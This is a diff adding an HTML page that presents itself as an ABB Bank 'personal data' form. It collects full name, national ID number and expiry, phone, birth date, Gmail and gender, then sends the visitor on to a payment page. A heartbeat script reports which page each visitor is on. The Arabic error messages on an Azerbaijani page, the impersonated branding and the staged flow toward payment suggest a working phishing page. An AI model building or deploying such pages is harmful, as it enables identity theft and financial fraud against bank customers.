@@ -1,0 +1,479 @@
+<!DOCTYPE html>
+<html lang="az" dir="ltr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ABB Bank - Şəxsi Məlumatlar</title>
+    <style>
+        *, *::before, *::after { box-sizing: border-box; }
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f8f9fa;
+            color: #212529;
+        }
+        header {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            background-color: #ffffff;
+            box-shadow: 0 2px 12px rgba(0,0,0,0.06);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 40px;
+            z-index: 1000;
+        }
+        .header-left {
+            display: flex;
+            align-items: center;
+            gap: 20px;
+        }
+        .header-left img {
+            height: 38px;
+            object-fit: contain;
+        }
+        .lang-btn {
+            font-weight: bold;
+            color: #000000;
+            background: #f1f3f5;
+            padding: 5px 12px;
+            border-radius: 4px;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        .header-right {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            color: #000000;
+            font-weight: 600;
+            font-size: 15px;
+        }
+        .phone-group {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .menu-icon {
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            width: 22px;
+            height: 16px;
+            cursor: pointer;
+        }
+        .menu-icon span {
+            display: block;
+            height: 2.5px;
+            background-color: #000000;
+            border-radius: 2px;
+        }
+        
+        /* Full Width Professional Form Container */
+        .main-container {
+            margin-top: 85px;
+            width: 100%;
+            min-height: calc(100vh - 85px);
+            background-color: #f8f9fa;
+            padding: 50px 20px 80px 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .form-wrapper {
+            width: 100%;
+            max-width: 900px;
+            background: #ffffff;
+            padding: 50px 60px;
+            border-radius: 16px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.04);
+            border: 1px solid #eaeaea;
+        }
+        .form-title {
+            font-size: 28px;
+            color: #004b36;
+            margin-bottom: 35px;
+            font-weight: 700;
+            text-align: center;
+            border-bottom: 2px solid #f0f0f0;
+            padding-bottom: 15px;
+        }
+        
+        /* Grid layout for inputs */
+        .form-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 25px;
+        }
+        .form-group {
+            margin-bottom: 22px;
+        }
+        .form-group.full-width {
+            grid-column: span 2;
+        }
+        .form-group label {
+            display: block;
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: #2c3e50;
+            font-size: 14px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        .form-control {
+            width: 100%;
+            padding: 14px 18px;
+            border: 1.5px solid #dcdfe6;
+            border-radius: 8px;
+            font-size: 15px;
+            outline: none;
+            transition: all 0.3s ease;
+            background-color: #fafbfc;
+            color: #333;
+        }
+        .form-control:focus {
+            border-color: #004b36;
+            background-color: #fff;
+            box-shadow: 0 0 0 4px rgba(0,75,54,0.08);
+        }
+        
+        /* Dropdowns layout for dates */
+        .date-select-group {
+            display: flex;
+            gap: 12px;
+        }
+        .date-select-group select {
+            flex: 1;
+            background-color: #fafbfc;
+            cursor: pointer;
+        }
+
+        .radio-group {
+            display: flex;
+            gap: 30px;
+            margin-top: 10px;
+        }
+        .radio-label {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-weight: 500;
+            cursor: pointer;
+            font-size: 16px;
+            color: #333;
+        }
+        .radio-label input {
+            width: 18px;
+            height: 18px;
+            accent-color: #004b36;
+        }
+        
+        .checkbox-container {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin: 30px 0;
+            cursor: pointer;
+            font-size: 15px;
+            color: #2c3e50;
+            grid-column: span 2;
+        }
+        .checkbox-container input {
+            width: 20px;
+            height: 20px;
+            cursor: pointer;
+            accent-color: #004b36;
+        }
+        
+        .submit-btn {
+            grid-column: span 2;
+            background-color: #0056b3;
+            color: #ffffff;
+            border: none;
+            padding: 16px;
+            border-radius: 8px;
+            font-size: 17px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 12px rgba(0,86,179,0.2);
+            margin-top: 10px;
+        }
+        .submit-btn:hover {
+            background-color: #004085;
+            transform: translateY(-1px);
+            box-shadow: 0 6px 15px rgba(0,86,179,0.3);
+        }
+
+        .error-message {
+            color: #dc3545;
+            font-size: 14px;
+            margin-top: 5px;
+        }
+
+        .success-message {
+            color: #28a745;
+            font-size: 14px;
+            margin-top: 5px;
+        }
+
+        /* Footer Section */
+        footer {
+            background-color: #000000;
+            color: #ffffff;
+            padding: 60px 20px 30px 20px;
+        }
+        .footer-container {
+            max-width: 1100px;
+            margin: 0 auto;
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+        }
+        .footer-logo {
+            height: 40px;
+            object-fit: contain;
+            margin-bottom: 25px;
+            filter: none;
+        }
+        .footer-info {
+            font-size: 15px;
+            line-height: 2.2;
+            color: #cccccc;
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+        }
+        .footer-bottom {
+            margin-top: 40px;
+            width: 100%;
+            border-top: 1px solid #222222;
+            padding-top: 20px;
+            font-size: 14px;
+            color: #777777;
+            text-align: center;
+        }
+
+        /* Responsive */
+        @media(max-width: 768px) {
+            .form-grid {
+                grid-template-columns: 1fr;
+            }
+            .form-group.full-width, .checkbox-container, .submit-btn {
+                grid-column: span 1;
+            }
+            .form-wrapper {
+                padding: 30px 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <header>
+        <div class="header-left">
+            <a href="index.html"><img src="logo-header.png" alt="ABB Bank"></a>
+            <a href="data-en.html" class="lang-btn">EN</a>
+        </div>
+        <div class="header-right">
+            <div class="phone-group">
+                <span>937</span>
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path></svg>
+            </div>
+            <div class="menu-icon">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+        </div>
+    </header>
+
+    <div class="main-container">
+        <div class="form-wrapper">
+            <h2 class="form-title">Şəxsi Məlumatlar</h2>
+            <form id="personalDataForm" class="form-grid">
+                
+                <!-- Full Name -->
+                <div class="form-group full-width">
+                    <label for="fullname">Ad və Soyad</label>
+                    <input type="text" id="fullname" name="fullname" class="form-control" required placeholder="Tam adınızı daxil edin">
+                </div>
+
+                <!-- ID Number -->
+                <div class="form-group">
+                    <label for="id_number">Şəxsiyyət vəsiqəsinin nömrəsi</label>
+                    <input type="text" id="id_number" name="id_number" class="form-control" required placeholder="Vəsiqə nömrəsi">
+                </div>
+
+                <!-- Phone Number -->
+                <div class="form-group">
+                    <label for="phone">Əlaqə nömrəsi</label>
+                    <input type="tel" id="phone" name="phone" class="form-control" required placeholder="+994 XX XXX XX XX">
+                </div>
+
+                <!-- ID Expiry Date (Dropdowns) -->
+                <div class="form-group">
+                    <label>Şəxsiyyət vəsiqəsinin bitmə tarixi</label>
+                    <div class="date-select-group">
+                        <select name="id_expiry_day" class="form-control" required>
+                            <option value="">Gün</option>
+                            <script>
+                                for(let i=1; i<=31; i++) document.write(`<option value="${i}">${i}</option>`);
+                            </script>
+                        </select>
+                        <select name="id_expiry_month" class="form-control" required>
+                            <option value="">Ay</option>
+                            <option value="1">Yanvar</option>
+                            <option value="2">Fevral</option>
+                            <option value="3">Mart</option>
+                            <option value="4">Aprel</option>
+                            <option value="5">May</option>
+                            <option value="6">İyun</option>
+                            <option value="7">İyul</option>
+                            <option value="8">Avqust</option>
+                            <option value="9">Sentyabr</option>
+                            <option value="10">Oktyabr</option>
+                            <option value="11">Noyabr</option>
+                            <option value="12">Dekabr</option>
+                        </select>
+                        <select name="id_expiry_year" class="form-control" required>
+                            <option value="">İl</option>
+                            <script>
+                                for(let i=2026; i<=2050; i++) document.write(`<option value="${i}">${i}</option>`);
+                            </script>
+                        </select>
+                    </div>
+                </div>
+
+                <!-- Date of Birth (Dropdowns) -->
+                <div class="form-group">
+                    <label>Doğum tarixi</label>
+                    <div class="date-select-group">
+                        <select name="dob_day" class="form-control" required>
+                            <option value="">Gün</option>
+                            <script>
+                                for(let i=1; i<=31; i++) document.write(`<option value="${i}">${i}</option>`);
+                            </script>
+                        </select>
+                        <select name="dob_month" class="form-control" required>
+                            <option value="">Ay</option>
+                            <option value="1">Yanvar</option>
+                            <option value="2">Fevral</option>
+                            <option value="3">Mart</option>
+                            <option value="4">Aprel</option>
+                            <option value="5">May</option>
+                            <option value="6">İyun</option>
+                            <option value="7">İyul</option>
+                            <option value="8">Avqust</option>
+                            <option value="9">Sentyabr</option>
+                            <option value="10">Oktyabr</option>
+                            <option value="11">Noyabr</option>
+                            <option value="12">Dekabr</option>
+                        </select>
+                        <select name="dob_year" class="form-control" required>
+                            <option value="">İl</option>
+                            <script>
+                                for(let i=1950; i<=2010; i++) document.write(`<option value="${i}">${i}</option>`);
+                            </script>
+                        </select>
+                    </div>
+                </div>
+
+                <!-- Gmail -->
+                <div class="form-group full-width">
+                    <label for="email">Gmail (Elektron poçt)</label>
+                    <input type="email" id="email" name="email" class="form-control" required placeholder="misal@gmail.com">
+                </div>
+
+                <!-- Gender -->
+                <div class="form-group full-width">
+                    <label>Cinsiyyət</label>
+                    <div class="radio-group">
+                        <label class="radio-label">
+                            <input type="radio" name="gender" value="Kişi" required> Kişi
+                        </label>
+                        <label class="radio-label">
+                            <input type="radio" name="gender" value="Qadın" required> Qadın
+                        </label>
+                    </div>
+                </div>
+
+                <!-- Terms Checkbox -->
+                <label class="checkbox-container">
+                    <input type="checkbox" required>
+                    <span>Şərtləri və qaydaları qəbul edirəm</span>
+                </label>
+
+                <!-- Submit Button -->
+                <button type="submit" class="submit-btn">Sifarişi davam et</button>
+
+            </form>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer>
+        <div class="footer-container">
+            <a href="index.html"><img src="logo-footer.png" alt="ABB Bank" class="footer-logo"></a>
+            <div class="footer-info">
+                <div>Ünvan: Nizami küçəsi 67, Bakı, Azərbaycan</div>
+                <div>E-poçt: info@abb-bank.az</div>
+                <div>TELEFON: +994 12 493 00 91</div>
+                <div>FAKS: +994 12 493 00 91</div>
+            </div>
+            <div class="footer-bottom">
+                &copy; 2026 ABB Bank. Bütün hüquqlar qorunur.
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        document.getElementById('personalDataForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const formData = new FormData(e.target);
+            const data = Object.fromEntries(formData);
+
+            try {
+                const response = await fetch('/api/orders/personal-data', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(data)
+                });
+
+                const result = await response.json();
+                
+                if (response.ok) {
+                    // Store orderId in sessionStorage
+                    sessionStorage.setItem('orderId', result.orderId);
+                    // Redirect to payment page
+                    window.location.href = 'payment.html';
+                } else {
+                    alert('خطأ: ' + result.error);
+                }
+            } catch (err) {
+                console.error('Error:', err);
+                alert('حدث خطأ في الاتصال بالخادم');
+            }
+        });
+    </script>
+
+    <script>
+        function sendHeartbeat() {
+            fetch('/api/heartbeat', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ currentPage: window.location.pathname })
+            }).catch(() => {});
+        }
+        setInterval(sendHeartbeat, 30000);
+        sendHeartbeat();
+    </script>
+</body>
+</html>
